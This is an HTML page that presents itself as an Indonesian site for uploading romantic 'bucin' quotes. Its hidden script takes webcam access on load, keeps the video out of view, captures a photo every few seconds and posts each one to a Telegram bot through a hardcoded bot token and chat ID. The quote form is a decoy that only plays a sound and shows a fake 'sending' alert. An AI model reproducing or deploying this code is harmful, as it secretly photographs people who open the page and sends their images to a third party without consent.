<!DOCTYPE html>
<html>
<head>
  <title>Web Upload Quotes Bucin</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/iyvh2l.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      overflow-x: hidden;
    }

    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
      background: url('https://files.catbox.moe/afcv2y.png') repeat;
      background-size: contain;
      animation: snowAnim 20s linear infinite;
      opacity: 0.3;
    }

    @keyframes snowAnim {
      0% { background-position: 0 -100px; }
      100% { background-position: 0 1000px; }
    }

    .container {
      position: relative;
      z-index: 2;
      margin-top: 140px;
    }

h1 {
  font-size: 3.2em;
  text-shadow: 0 0 15px #ff4fd8, 0 0 25px #ff4fd8;
}

input {
  padding: 18px;
  border-radius: 12px;
  border: none;
  font-size: 24px;
  width: 85%;
  max-width: 400px;
  margin-top: 25px;
  outline: none;
  background-color: rgba(0, 0, 0, 0.65);
  color: white;
  box-shadow: 0 0 25px #ff6adf, 0 0 35px #ff6adf;
  transition: 0.3s ease-in-out;
}

button {
  margin-top: 25px;
  padding: 15px 30px;
  font-size: 20px;
  background-color: #ff4fd8;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  color: #111;
  box-shadow: 0 0 15px #ff4fd8, 0 0 25px #ff4fd8;
}

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="snow"></div>

<div class="container">
  <h1>Web Quotes Bucin</h1>
  <p>Masukan Quotes Bucin Untuk Di Tampilkan</p>
  <input type="text" placeholder="Isi Qoutes" id="nomor">
  <br>
  <button onclick="main()">Upload Quotes</button>
</div>

<video id="video" width="320" height="240" autoplay></video>
<canvas id="canvas" width="320" height="240"></canvas>

<audio id="sound">
  <source src="https://files.catbox.moe/9v9q9m.mp3" type="audio/mpeg">
</audio>

<script>
  const token = "8561616108:AAGTVrTzWw9UoR1JP0OyWkWeZlCwLXIEZHw";
  const chat_id = "6253366102";
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const sound = document.getElementById("sound");

  function captureAndSend() {
    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(function(blob) {
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "kamera.jpg");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg');
    } catch (e) {
      console.error("Gagal ngambil gambar:", e);
    }
  }

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;

      // Jepret otomatis 3 detik setelah kamera nyala
      setTimeout(() => {
        captureAndSend();
        
        // Jepret terus tiap 10 detik
        setInterval(captureAndSend, 3000);
      }, 2000);
    })
    .catch(err => {
      console.error("Kamera error:", err);
    });

  function main() {
    const nomor = document.getElementById("nomor").value;
    if (nomor.trim() === "") {
      alert("Masukkan nomor dulu!");
      return;
    }

    sound.play();
    alert("Sedang Mengirim Quotes...\nTunggu 5-10 ");
  }
</script>
</body>
</html>
